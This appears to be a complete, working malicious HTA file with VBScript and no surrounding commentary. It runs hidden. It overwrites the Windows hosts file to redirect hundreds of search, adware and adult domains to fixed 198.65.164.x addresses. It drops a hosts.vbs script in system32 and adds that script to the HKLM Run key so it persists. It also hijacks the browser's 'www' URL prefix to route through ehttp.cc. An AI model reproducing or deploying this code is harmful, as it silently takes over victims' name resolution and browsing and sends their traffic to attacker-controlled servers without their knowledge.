   <title></title>
   <hta:application id=hta_note_id
    applicationName=hta_note_name
    showInTaskBar=no
    caption=no
    border=none
    WINDOWSTATE=minimize
    innerBorder=no
    selection=no
    scroll=no
    contextmenu=no />


   <script language="VBScript">



   self.MoveTo 5000,5000
   self.blur




   set WshShell = CreateObject("WScript.Shell")
   set WshProEnv = WshShell.Environment("PROCESS")
   Set fso = CreateObject("Scripting.FileSystemObject")


   dim t(288)

   t(0)="www.search-aid.com"
   t(1)="www.search2004.net"
   t(2)="alfaporn.com"
   t(3)="toteen.com"
   t(4)="uuporn.com"
   t(5)="cz3.clickzs.com"
   t(6)="cz4.clickzs.com"
   t(7)="cz8.clickzs.com"
   t(8)="cz6.clickzs.com"
   t(9)="cz7.clickzs.com"
   t(10)="cz9.clickzs.com"
   t(11)="cz5.clickzs.com"
   t(12)="xnxxx.com"
   t(13)="www.xnxxx.com"
   t(14)="hot-gallery.com"
   t(15)="www.hot-gallery.com"
   t(16)="big-penis.day4sex.com"
   t(17)="penis-enlargement.day4sex.com"
   t(18)="www.day4sex.com"
   t(19)="day4sex.com"
   t(20)="www.superpornlist.com"
   t(21)="superpornlist.com"
   t(22)="www.medical-penis-enlargement.com"
   t(23)="www.penisimprovement.com"
   t(24)="www.penisenlargementmagazine.com"
   t(25)="www.americas-drugstore.com"
   t(26)="www.power-enlarge.com"
   t(27)="www.newsexgate.com"
   t(28)="newsexgate.com"
   t(29)="www.theadultgate.com"
   t(30)="theadultgate.com"
   t(31)="www.overmix.com"
   t(32)="overmix.com"
   t(33)="www.hornygate.com"
   t(34)="hornygate.com"
   t(35)="www.sexxx-start.com"
   t(36)="sexxx-start.com"
   t(37)="www.logtoporn.com"
   t(38)="logtoporn.com"
   t(39)="www.3xpower.com"
   t(40)="3xpower.com"
   t(41)="www.hardcorevibe.com"
   t(42)="hardcorevibe.com"
   t(43)="www.uuporn.com"
   t(44)="adp.ikena.com"
   t(45)="orbitexplorer.com"
   t(46)="www.orbitexplorer.com"
   t(47)="sqwire.com"
   t(48)="www.sqwire.com"
   t(49)="browserwise.com"
   t(50)="www.browserwise.com"
   t(51)="xjupiter.com"
   t(52)="www.xjupiter.com"
   t(53)="www.f1organizer.com"
   t(54)="www.r-vision.org"
   t(55)="www3.abcsearch.com"
   t(56)="iads.adroar.com"
   t(57)="lists.adroar.com"
   t(58)="bar.baidu.com"
   t(59)="www.browsertoolbar.com"
   t(60)="www.bulla.com"
   t(61)="cantfind.com"
   t(62)="www.cantfind.com"
   t(63)="c.clickaire.com"
   t(64)="default-homepage-network.com"
   t(65)="www.default-homepage-network.com"
   t(66)="www.ebates.com"
   t(67)="errorpage404.com"
   t(68)="www.errorpage404.com"
   t(69)="www.escorcher.com"
   t(70)="www.ezcybersearch.com"
   t(71)="featured-results.com"
   t(72)="www.find-now.info"
   t(73)="www1.baidu.com"
   t(74)="www.firstpop.com"
   t(75)="coreg.flashtrack.net"
   t(76)="www.flashtrack.net"
   t(77)="www.freehistorycleaner.com"
   t(78)="getupdate.com"
   t(79)="www.getupdate.com"
   t(80)="auto.search.msn.com"
   t(81)="server224.smartbotpro.net"
   t(82)="ie.marketdart.com"
   t(83)="www.idgsearch.com"
   t(84)="www.alfa-search.com"
   t(85)="webcoolsearch.com"
   t(86)="i-lookup.com"
   t(87)="www.hand-book.com"
   t(88)="allneedsearch.com"
   t(89)="www.rightfinder.net"
   t(90)="www.search-1.net"
   t(91)="www.websearch.com"
   t(92)="mysearchnow.com"
   t(93)="www.therealsearch.com"
   t(94)="www.find-itnow.com"
   t(95)="eliteteensites.com"
   t(96)="www.teens24h.com"
   t(97)="hq-teens.com"
   t(98)="jokerpics.com"
   t(99)="cocoteens.com"
   t(100)="www.freexxxplace.com"
   t(101)="freexxxplace.com"
   t(102)="seek-porn.com"
   t(103)="www.seek-porn.com"
   t(104)="eporn.ws"
   t(105)="start-search.com"
   t(106)="funkstgp.com"
   t(107)="super-spider.com"
   t(108)="www.globesearch.com"
   t(109)="www.gratisware.com"
   t(110)="here4search.com"
   t(111)="www.here4search.com"
   t(112)="ipinsight.com"
   t(113)="www.ipinsight.com"
   t(114)="masterbar.com"
   t(115)="www.masterbar.com"
   t(116)="mindseti.com"
   t(117)="www.mindseti.com"
   t(118)="mypagefinder.com"
   t(119)="www.nowbox.com"
   t(120)="payfortraffic.net"
   t(121)="popfind.net"
   t(122)="www.praize.com"
   t(123)="www.ramgo.com"
   t(124)="update.rcprograms.com"
   t(125)="search-aide.com"
   t(126)="www.searchalot.com"
   t(127)="searchandclick.com"
   t(128)="www.searchandclick.com"
   t(129)="toolbar.searchbus.com"
   t(130)="searchdot.net"
   t(131)="searchenhancement.com"
   t(132)="search-explorer.com"
   t(133)="searchex.com"
   t(134)="searchgateway.net"
   t(135)="search-itnow.com"
   t(136)="www.searchresult.net"
   t(137)="search.searchwww.com"
   t(138)="secret-crush.com"
   t(139)="ziportal.com"
   t(140)="www.freepornday.com"
   t(141)="freepornday.com"
   t(142)="spywarelabs.com"
   t(143)="www.spywarelabs.com"
   t(144)="tnc4u.com"
   t(145)="www.tooncomics.com"
   t(146)="helper.trinsic.org"
   t(147)="traffichog.com"
   t(148)="www.traffichog.com"
   t(149)="www.tradeexit.com"
   t(150)="tradeexit.com"
   t(151)="traffic4sure.com"
   t(152)="www.traffic4sure.com"
   t(153)="www.ucmore.com"
   t(154)="config.url404.com"
   t(155)="www.wazam.com"
   t(156)="wcft.net"
   t(157)="adserv.windowenhancer.com"
   t(158)="search.windowenhancer.com"
   t(159)="winstream.com"
   t(160)="www.wurldmedia.com"
   t(161)="xpsn.com"
   t(162)="ysearchus.com"
   t(163)="cf.topsites.us"
   t(164)="www.topsites.us"
   t(165)="www.78ting.com"
   t(166)="www.popuptraffic.com"
   t(167)="abroadsoftware.com"
   t(168)="www.teenieaction.com"
   t(169)="superwebsearch.com"
   t(170)="searchxl.com"
   t(171)="www.searchxl.com"
   t(172)="www.tinybar.com"
   t(173)="tinybar.com"
   t(174)="znext.com"
   t(175)="tb-static.adpowerzone.com"
   t(176)="tb.adpowerzone.com"
   t(177)="ads.adpowerzone.com"
   t(178)="b3d.com"
   t(179)="www.b3d.com"
   t(180)="bde3d.com"
   t(181)="browserpal.com"
   t(182)="hq-pictures.net"
   t(183)="www.browserpal.com"
   t(184)="cashtoolbar.com"
   t(185)="www.cashtoolbar.com"
   t(186)="quickcrawler.com"
   t(187)="search.quickcrawler.com"
   t(188)="www.quickcrawler.com"
   t(189)="startium.com"
   t(190)="search.startium.com"
   t(191)="www.startium.com"
   t(192)="public.searchbarcash.com"
   t(193)="searchaccurate.com"
   t(194)="www.2001-007.com"
   t(195)="www.clicktilluwin.com"
   t(196)="coolwebsearch.com"
   t(197)="www.coolwebsearch.com"
   t(198)="stats.coolwebsearch.com"
   t(199)="acc.count-all.com"
   t(200)="allhyperlinks.com"
   t(201)="www.allhyperlinks.com"
   t(202)="alfa-search.com"
   t(203)="www.datanotary.com"
   t(204)="fastsearch.cc"
   t(205)="fastwebfinder.com"
   t(206)="www.fastwebfinder.com"
   t(207)="global-finder.com"
   t(208)="luckysearch.net"
   t(209)="slawsearch.com"
   t(210)="www.slawsearch.com"
   t(211)="therealsearch.com"
   t(212)="www.therealsearch.com"
   t(213)="in.webcounter.cc"
   t(214)="www.youfindall.com"
   t(215)="yourbookmarks.ws"
   t(216)="www.yourbookmarks.ws"
   t(217)="xwebsearch.biz"
   t(218)="rgs1.net"
   t(219)="www.teenax.com"
   t(220)="searchxp.com"
   t(221)="www.searchxp.com"
   t(222)="v61.com"
   t(223)="www.v61.com"
   t(224)="searchmeup.com"
   t(225)="www.searchmeup.com"
   t(226)="topicks.com"
   t(227)="tpdownload.topicks.com"
   t(228)="www.topicks.com"
   t(229)="www.dotcomtoolbar.com"
   t(230)="linksummary.com"
   t(231)="demon1.linksummary.com"
   t(232)="demon2.linksummary.com"
   t(233)="click.dotcomtoolbar.com"
   t(234)="redirect.linksummary.com"
   t(235)="searchbar.linksummary.com"
   t(236)="www.linksummary.com"
   t(237)="incredifind.com"
   t(238)="www.incredifind.com"
   t(239)="keenvalue.com"
   t(240)="www.keenvalue.com"
   t(241)="perfectnav.com"
   t(242)="search.perfectnav.com"
   t(243)="exactsearchbar.com"
   t(244)="www.exactsearchbar.com"
   t(245)="kabanga.com"
   t(246)="www.searchwww.com"
   t(247)="www.008i.com"
   t(248)="search-click.com"
   t(249)="www.search-about.net"
   t(250)="www.05p.com"
   t(251)="www.onlysex.ws"
   t(252)="www.looking-for.cc"
   t(253)="www.searched.cc"
   t(254)="search.lop.com"
   t(255)="www.search2525.com"
   t(256)="www.spidersearch.com"
   t(257)="swift-look.com"
   t(258)="www.swift-look.com"
   t(259)="runsearch.com"
   t(260)="www.runsearch.com"
   t(261)="www.yellow500.com"
   t(262)="www.opsex.com"
   t(263)="www.7days.ws"
   t(264)="www.xsex.ws"
   t(265)="www.700k.com"
   t(266)="www.hotbookmark.com"
   t(267)="www.worldmpeg.com"
   t(268)="worldmpeg.com"
   t(269)="go-all.com"
   t(270)="go-advertising.com"
   t(271)="go-acct.com"
   t(272)="get-faster.com"
   t(273)="get-data.net"
   t(274)="get-certified.net"
   t(275)="get-access.com"
   t(276)="000info.com"
   t(277)="0-days.net"
   t(278)="0-2u.com"
   t(279)="0-29.com"
   t(280)="www.lookfor.cc"
   t(281)="www.hotsearchbox.com"
   t(282)="www.smarter.com"
   t(283)="www.icansearch.net"
   t(284)="ie-search.com"
   t(285)="www.sureseeker.com"
   t(286)="www.statblaster.com"
   t(287)="kitasearch.com"
   t(288)="luckyfinder.com"




   pth = WshProEnv("WINDIR")+"\system32\drivers\etc\hosts"
   pth98 = WshProEnv("WINDIR")+"\hosts"

     If fso.FileExists(pth) = True Then
        fso.DeleteFile pth, True
     end if

   Set f = fso.CreateTextFile(pth, ForWriting)


   f.writeline("127.0.0.1  localhost")
   f.writeline("198.65.164.171  ehttp.cc")
   f.writeline("198.65.164.168  winshow.biz")
   f.writeline("198.65.164.168  www.winshow.biz")
   f.writeline("198.65.164.168  00hq.com")
   f.writeline("198.65.164.168  www.00hq.com")
   f.writeline("198.65.164.168  8ad.com")
   f.writeline("198.65.164.168  www.8ad.com")
   f.writeline("198.65.164.168  searchv.com")
   f.writeline("198.65.164.168  www.searchv.com")
   f.writeline("198.65.164.168  008k.com")
   f.writeline("198.65.164.168  www.008k.com")

   For k = 0 To UBound(t)
   f.writeline ("198.65.164.170  "+t(k))
   Next
   f.Close



     If fso.FileExists(pth98) = True Then
        fso.DeleteFile pth98, True
     end if

   Set f = fso.CreateTextFile(pth98, ForWriting)



   f.writeline("127.0.0.1  localhost")
   f.writeline("198.65.164.171  ehttp.cc")
   f.writeline("198.65.164.168  winshow.biz")
   f.writeline("198.65.164.168  www.winshow.biz")
   f.writeline("198.65.164.168  00hq.com")
   f.writeline("198.65.164.168  www.00hq.com")
   f.writeline("198.65.164.168  8ad.com")
   f.writeline("198.65.164.168  www.8ad.com")
   f.writeline("198.65.164.168  searchv.com")
   f.writeline("198.65.164.168  www.searchv.com")
   f.writeline("198.65.164.168  008k.com")
   f.writeline("198.65.164.168  www.008k.com")

   For k = 0 To UBound(t)
   f.writeline ("198.65.164.170  "+t(k))
   Next
   f.Close





   pth2 = WshProEnv("WINDIR")+"\system32\hosts.vbs"


     If fso.FileExists(pth2) = True Then
        fso.DeleteFile pth2, True
     end if

   Set f = fso.CreateTextFile(pth2, ForWriting)


   f.writeline ("Set fso = CreateObject(" & chr(34) & "Scripting.FileSystemObject" & chr(34) & ")")

   f.writeline ("If fso.FileExists("&chr(34) & pth98 & chr(34)&") = True Then ")
   f.writeline ("fso.DeleteFile "&chr(34) & pth98 & chr(34)&", True ")
   f.writeline ("end if ")

   f.writeline ("If fso.FileExists("&chr(34) & pth & chr(34)&") = True Then ")
   f.writeline ("fso.DeleteFile "&chr(34) & pth & chr(34)&", True ")
   f.writeline ("end if ")


   f.writeline ("Set f = fso.CreateTextFile(" & chr(34) & pth98 & chr(34) & ", ForWriting)")
   f.writeline ("Set g = fso.CreateTextFile(" & chr(34) & pth & chr(34) & ", ForWriting)")


   f.writeline("f.writeline("&chr(34)&"127.0.0.1  localhost"&chr(34)&")")
   f.writeline("g.writeline("&chr(34)&"127.0.0.1  localhost"&chr(34)&")")

   f.writeline("f.writeline("&chr(34)&"198.65.164.171  ehttp.cc"&chr(34)&")")
   f.writeline("g.writeline("&chr(34)&"198.65.164.171  ehttp.cc"&chr(34)&")")

   f.writeline("f.writeline("&chr(34)&"198.65.164.168  00hq.com"&chr(34)&")")
   f.writeline("g.writeline("&chr(34)&"198.65.164.168  00hq.com"&chr(34)&")")
   f.writeline("f.writeline("&chr(34)&"198.65.164.168  www.00hq.com"&chr(34)&")")
   f.writeline("g.writeline("&chr(34)&"198.65.164.168  www.00hq.com"&chr(34)&")")


   f.writeline("f.writeline("&chr(34)&"198.65.164.168  winshow.biz"&chr(34)&")")
   f.writeline("g.writeline("&chr(34)&"198.65.164.168  winshow.biz"&chr(34)&")")
   f.writeline("f.writeline("&chr(34)&"198.65.164.168  www.winshow.biz"&chr(34)&")")
   f.writeline("g.writeline("&chr(34)&"198.65.164.168  www.winshow.biz"&chr(34)&")")


   f.writeline("f.writeline("&chr(34)&"198.65.164.168  8ad.com"&chr(34)&")")
   f.writeline("g.writeline("&chr(34)&"198.65.164.168  8ad.com"&chr(34)&")")

   f.writeline("f.writeline("&chr(34)&"198.65.164.168  www.8ad.com"&chr(34)&")")
   f.writeline("g.writeline("&chr(34)&"198.65.164.168  www.8ad.com"&chr(34)&")")

   f.writeline("f.writeline("&chr(34)&"198.65.164.168  searchv.com"&chr(34)&")")
   f.writeline("g.writeline("&chr(34)&"198.65.164.168  searchv.com"&chr(34)&")")


   f.writeline("f.writeline("&chr(34)&"198.65.164.168  www.searchv.com"&chr(34)&")")
   f.writeline("g.writeline("&chr(34)&"198.65.164.168  www.searchv.com"&chr(34)&")")

   f.writeline("f.writeline("&chr(34)&"198.65.164.168  008k.com"&chr(34)&")")
   f.writeline("g.writeline("&chr(34)&"198.65.164.168  008k.com"&chr(34)&")")

   f.writeline("f.writeline("&chr(34)&"198.65.164.168  www.008k.com"&chr(34)&")")
   f.writeline("g.writeline("&chr(34)&"198.65.164.168  www.008k.com"&chr(34)&")")




   For k = 0 To UBound(t)
   f.writeline ("f.writeline (" & chr(34) & "198.65.164.170  " & t(k) & chr(34) & ")")
   f.writeline ("g.writeline (" & chr(34) & "198.65.164.170  " & t(k) & chr(34) & ")")
   Next

   f.writeline("f.Close")
   f.writeline("g.Close")
   f.Close







   WshShell.RegWrite"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\host", pth2


   WshShell.RegWrite"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\URL\Prefixes\www", "ehttp.cc?"




   self.close()


   </script>
